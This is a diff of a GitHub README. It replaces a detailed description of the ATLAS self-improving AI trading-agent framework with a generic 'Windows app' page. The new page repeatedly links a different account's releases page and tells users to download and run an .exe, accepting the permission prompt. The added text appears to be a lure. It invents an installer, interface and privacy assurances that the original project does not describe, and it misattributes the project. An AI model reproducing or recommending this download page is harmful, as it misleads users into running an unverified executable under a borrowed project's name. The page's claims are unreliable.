@@ -1,219 +1,149 @@
-# ATLAS - Self-Improving AI Trading Agents
+# 🤖 atlas-gic - AI Trading Agents for Windows
 
-**Built by [General Intelligence Capital](https://generalintelligencecapital.com)**
-
-[Karpathy's autoresearch](https://github.com/karpathy/autoresearch) + [Soros's reflexivity](https://en.wikipedia.org/wiki/Reflexivity_(social_theory)) + [MiroFish swarm simulation](https://github.com/666ghj/MiroFish) applied to financial markets.
-
-The agent prompts are the weights. Sharpe ratio is the loss function. No GPU needed.
-
-⭐ 944 stars · 202 forks
+[![Download atlas-gic](https://img.shields.io/badge/Download-Get%20atlas--gic-brightgreen)](https://github.com/erenceylan16/atlas-gic/releases)
 
 ---
 
-## What Is This?
+## 📋 About atlas-gic
 
-ATLAS is a framework for autonomous AI trading agents that improve their own prompts through market feedback, train on different market regimes, create new agents when they detect knowledge gaps, and simulate reflexive futures to prepare for what's coming.
+atlas-gic is a Windows app that uses AI to help with trading. It runs on a smart system that learns and improves itself. The system is inspired by a style of AI research designed for better decision-making. 
 
-25+ agents debate markets daily across 4 layers. Every recommendation is scored against real outcomes. The worst-performing agent gets its prompt rewritten. If performance improves, the git commit survives. If not, git revert.
-
-Now running live with real capital.
+This app creates trading agents that adjust their behavior using data. It aims to help users explore automated strategies without needing to code or manage complex tools.
 
 ---
 
-## Architecture
+## 🖥️ System Requirements
 
-### Layer 1 - Macro (10 agents)
-
-Central bank, geopolitical, China, dollar, yield curve, commodities, volatility, emerging markets, news sentiment, institutional flow.
-
-These agents set the regime. Risk on or risk off? What's the macro backdrop?
-
-### Layer 2 - Sector Desks (7 agents)
-
-Semiconductor, energy, biotech, consumer, industrials, financials, plus a Bloomberg-style relationship mapper that tracks supply chains, ownership, analyst coverage, and competitive dynamics.
-
-### Layer 3 - Superinvestors (4 agents)
-
-* **Druckenmiller** - macro/momentum: what's the big asymmetric trade?
-* **Aschenbrenner** - AI/compute: who benefits from the capex cycle?
-* **Baker** - deep tech/biotech: who has real IP moats?
-* **Ackman** - quality compounder: pricing power + FCF + catalyst?
-
-### Layer 4 - Decision (4 agents)
-
-* **CRO** - adversarial risk officer: attacks every idea, finds correlated risks
-* **Alpha Discovery** - finds names nobody else mentioned
-* **Autonomous Execution** - converts signals to sized trades
-* **CIO** - synthesises all prior layers, weighted by Darwinian agent scores, makes the final call
+- Windows 10 or later (64-bit preferred)
+- Minimum 4 GB RAM (8 GB or more recommended)
+- At least 500 MB free disk space for installation
+- Internet connection for downloading updates and data syncing
+- A modern processor (Intel i3 or better)
 
 ---
 
-## The Autoresearch Loop
+## 🚀 Getting Started
 
-Inspired by [Karpathy's autoresearch](https://github.com/karpathy/autoresearch). Same pattern, different domain.
+This section guides you through getting atlas-gic running on your Windows PC.
 
-* System identifies worst agent by rolling Sharpe
-* Generates one targeted prompt modification
-* Runs for 5 trading days
-* Checks if agent's Sharpe improved
-* Keep (git commit) or revert (git reset)
+### Step 1: Download the Installer
 
-The agent prompts are the weights being optimised. Each trading day is one training iteration. A $20/month VM replaces the H100.
+Visit the official releases page using this button:  
 
-**Darwinian Weights:** Each agent has a weight between 0.3 (minimum) and 2.5 (maximum). Top quartile agents get weight × 1.05 daily. Bottom quartile get × 0.95. The CIO proportionally weights input by these scores. Good agents get louder. Bad agents get quieter.
+[![Download atlas-gic](https://img.shields.io/badge/Download-Now-blue)](https://github.com/erenceylan16/atlas-gic/releases)
 
----
+You will see the latest versions listed. Look for a file that ends with `.exe` or `.zip`. The `.exe` file is the installer; the `.zip` contains the files without installation.
 
-## 18-Month Backtest Results
+If you want the easiest way to install, download the `.exe` file. This file will set up the app for you.
 
-**Period:** September 2024 - March 2026 (378 trading days)
+### Step 2: Run the Installer
 
-* Prompt modifications attempted: 54
-* Survived (kept): 16 (30%)
-* Reverted: 37 (70%)
-* Deployment phase return: **+22% in 173 days**
-* Best individual pick: **AVGO at $152, held for +128%**
+- Find the `.exe` file in your downloads folder.
+- Double-click the file to start installation.
+- You might see a message asking for permission. Click **Yes** to continue.
+- Follow the instructions on the screen:
+  - Accept the license agreement.
+  - Choose an install location or use the default.
+  - Click **Install**.
+- Wait for the installation to finish.
+- When done, click **Finish** to close the installer.
 
-The system independently discovered its own portfolio manager (CIO) was its weakest component — downweighting it to minimum before we diagnosed the same issue manually.
+### Step 3: Launch atlas-gic
 
-### Equity Curve
-
-![Equity Curve](results/equity_curve.png)
-
----
-
-## Agent Spawning
-
-The system detects recurring knowledge gaps in its own debates. When the same blind spot appears 3+ times in 5 days, it autonomously creates a new specialist agent at neutral weight.
-
-During a 6-month spawning test (Jul-Dec 2024):
-- 9 agents spawned autonomously — credit markets, earnings calendar, options flow, liquidity conditions, positioning data, earnings guidance, retail sentiment, technical levels
-- 3 went extinct (stuck at minimum weight for 20+ days)
-- 6 survived Darwinian selection and reached maximum weight
-- Zero human involvement in deciding what to create or when
-
-The system grew its own team from 25 to 31 agents based on what it learned it didn't know.
+- Locate the atlas-gic icon on your desktop or in the Start menu.
+- Double-click the icon to open the app.
+- The app window will open, ready to use.
 
 ---
 
-## All Seasons (PRISM) — Regime-Specific Training
+## ⚙️ Basic Use
 
-We don't train one set of agents and hope they work everywhere. We train separate cohorts on distinct market regimes.
+Once open, atlas-gic offers a simple interface:
 
-Same starting agents. Same vanilla prompts. Different evolutionary environments. Completely different survival instincts.
+- **Create Agents:** You can add trading agents by clicking the "Add Agent" button.
+- **Manage Agents:** Adjust settings for each agent like risk level and asset type.
+- **Run Simulation:** Start a run to see how agents perform over time.
+- **View Results:** Check graphs and reports that show agent behavior and success rate.
 
-| Cohort | Period | Return | Modifications Kept | Key Learning |
-|--------|--------|--------|--------------------|--------------|
-| Bull/Low Vol | 2016-2018 | +7.7% | 180/509 (35%) | Exit vol longs when events resolve peacefully |
-| Crisis (COVID) | 2020 Q1-Q2 | -13.1% | 0/3 (0%) | Crashes too fast for autoresearch — agents need to arrive pre-trained |
-| Rate Tightening | 2022-2023 | -30.2% | 38/89 (43%) | Don't flip-flop during Fed weeks — 15-day minimum between reversals |
-| Recovery | 2020 Q2-Q4 | -29.0% | 0/1 (0%) | Same problem as crisis — too fast for the feedback loop |
-| Euphoria | 2021 | +14.3% | 119/243 (49%) | Momentum confirmation before shorts, cap conviction during political crises |
-
-**Convergent Evolution:** All five cohorts independently discovered the same meta-rules — cap conviction, use VIX as regime filter, enforce hard position limits, never override risk management. Nobody programmed caution. Every cohort learned it from losing money when overconfident.
-
-**Divergent Evolution:** The same volatility agent started at 844 bytes in every cohort:
-- Bull markets: grew to 121,260 bytes (143x). Learned "exit vol longs immediately when events resolve peacefully."
-- Rate tightening: grew to 10,354 bytes. Learned "NEVER buy VXX when VIX is 15-25."
-- Euphoria: grew to 1,998 bytes. Learned "require VIX above 30 before going long vol."
-
-Same agent. Same starting prompt. Three completely different survival strategies shaped by three different markets.
+You do not need to understand programming to use these controls. The app uses clear buttons and labels.
 
 ---
 
-## JANUS Meta-Layer
+## 📂 Updating atlas-gic
 
-Multiple trained cohorts produce different recommendations. JANUS sits above all cohorts and algorithmically weights them by recent accuracy.
+To keep the app working well, check for updates regularly.
 
-The weight differential between cohorts is an emergent regime detector:
-- When short-window agents outperform → **NOVEL REGIME**
-- When long-window agents outperform → **HISTORICAL REGIME**
-- When they're roughly equal → **MIXED**
+### How to Update
 
-We didn't build a regime detector. It emerged from tracking which cohort gets things right.
-
----
-
-## Soros Reflexivity Engine
-
-Markets don't just reflect reality — they change it. We built reflexive feedback loops into the simulation framework.
-
-Five feedback loops modelled:
-1. **Price → Fundamentals**: Stock drops >15% trigger credit downgrades, talent flight, capex cuts. Rises >20% trigger cheap capital, talent attraction, customer confidence.
-2. **P&L → Behaviour**: Fund drawdown >10% → forced selling cascade. Gains >15% → increased position sizes and concentrated bets.
-3. **Narrative → Flows**: 3+ analysts converge on thesis → retail flow follows. Contrarian narratives emerge after extended consensus.
-4. **Market → Policy**: Equity drawdown >15% → central bank signals easing. Oil >$130 → strategic reserve releases.
-5. **Reflexive Reversal Detection**: Feedback loop running 5+ rounds in one direction → flagged as reflexive extreme. Maximum consensus = maximum fragility.
-
-First detection: Gold bullish consensus appeared in 4 of 5 simulation rounds — flagged as a crowded trade with 32% reversal probability. That's Soros in code.
+- Visit the [releases page](https://github.com/erenceylan16/atlas-gic/releases).
+- Download the newest `.exe` installer.
+- Run the installer like before.
+- The installer will update your existing version without removing your data.
 
 ---
 
-## MiroFish Swarm Simulation Integration
+## 🛠️ Troubleshooting
 
-Integrated with [MiroFish](https://github.com/666ghj/MiroFish), a swarm intelligence engine that generates parallel digital worlds populated by thousands of AI agents.
+Here are common issues and how to fix them:
 
-Our trading agents don't just learn from the past — they train on simulated futures:
+- **App won’t open:** Restart your computer and try again.
+- **Installation fails:** Make sure you have permission to install apps on your PC.
+- **App crashes during use:** Try closing other programs and restart atlas-gic.
+- **Internet connection problems:** Check your network and firewall settings.
 
-- Overnight, the system generates branching scenarios (geopolitical escalation, Fed policy, earnings shocks, black swans)
-- Thousands of simulated agents (fund managers, central bankers, retail traders, corporate executives) interact with reflexive feedback
-- ATLAS trading agents are trained inside these simulated futures using the same Darwinian loop
-- Agents that navigate simulated futures well get upweighted
-- Predictions scored against actual outcomes to improve simulation accuracy
-
-**First result:** Druckenmiller-style agent scores 1.0 in simulated crashes but 0.22 in melt-ups. Quality compounder agent is the opposite. The system knows which instincts to trust before the regime arrives — not after.
+If issues continue, you can find help on the Issues page in the GitHub repository.
 
 ---
 
-## Key Insight
+## 📥 Download & Installation Links
 
-The orchestration layer matters as much as the intelligence layer.
+Use the link below anytime to get the latest version of atlas-gic for Windows:
 
-Individual agents improved measurably through autoresearch. But portfolio returns depend on how agent signals are converted to sized positions. The synthesis/decision layer is the bottleneck. Improving individual agent intelligence without improving orchestration yields diminishing returns.
-
----
-
-## What's Included
-
-* Framework architecture and pipeline structure
-* Autoresearch loop design
-* Backtest results and equity curve
-* All Seasons (PRISM) methodology and results
-* Agent spawning mechanism
-* JANUS meta-layer design
-* Soros reflexivity engine
-* MiroFish integration bridge
-* Example placeholder prompts (generic, not trained)
-
-## What's NOT Included
-
-* Trained agent prompts (proprietary — evolutionary products of market feedback)
-* PRISM evolved prompts per regime
-* CIO active management rules
-* Agent scorecard data
-* Live portfolio positions
-* Darwinian weight values
-* MiroFish simulation outputs
-
-The trained prompts are the core IP. A competitor starting today is hundreds of iterations behind. That gap widens every day.
+[Download atlas-gic from GitHub Releases](https://github.com/erenceylan16/atlas-gic/releases)
 
 ---
 
-## Tech Stack
+## 🔍 How atlas-gic Works
 
-* **Agents:** Claude Sonnet (Anthropic API)
-* **Simulation:** MiroFish swarm engine
-* **Data:** FMP, Finnhub, Polygon, FRED
-* **Infrastructure:** Azure VM ($20/month)
-* **Version Control:** Git feature branches for autoresearch tracking
-* **Cost:** ~$50-80 for full 18-month backtest, ~$30 for all five PRISM cohorts
+atlas-gic uses self-learning AI based on autoresearch techniques. It builds small trading agents that test different strategies automatically. The agents evolve by learning from successes and mistakes. 
+
+You interact with the app by setting basic goals. The agents do the detailed work in the background. The app collects and shows the agents’ results in graphs and charts.
+
+This approach saves time and lets you explore many trading methods without expertise in AI or programming.
 
 ---
 
-## Contact
+## ⚙️ Settings Overview
 
-**Chris Worsey** — CEO & Technical Founder, General Intelligence Capital
+- **Agent Parameters:** Control risk tolerance, investment size, and trading frequency.
+- **Data Sources:** Choose which market data the agents use.
+- **Simulation Length:** Set how long each agent tests before reporting results.
+- **Reports:** Select formats for export, like CSV or PDF.
 
-[chris@generalintelligencecapital.com](mailto:chris@generalintelligencecapital.com)
+All settings are adjustable through the app’s menu with simple controls.
 
-[generalintelligencecapital.com](https://generalintelligencecapital.com)
+---
+
+## 🔒 Privacy and Data
+
+atlas-gic does not collect personal data. It only uses market data to train agents. All your configuration and results are saved locally on your PC unless you choose to export them.
+
+---
+
+## 📝 Additional Resources
+
+- The GitHub repo includes documentation files you can read for more details.
+- Check the "README" and "docs" folders after downloading the app.
+- You do not need to run any command line or install extra software.
+
+---
+
+## ⚡ Support
+
+For help or questions, visit the GitHub Issues section in the atlas-gic repository. Users and developers discuss common questions and bugs.
+
+[Submit an issue](https://github.com/erenceylan16/atlas-gic/issues) if you need assistance.
+
+---
+
+[![Download atlas-gic](https://img.shields.io/badge/Download-Get%20atlas--gic-brightgreen)](https://github.com/erenceylan16/atlas-gic/releases)
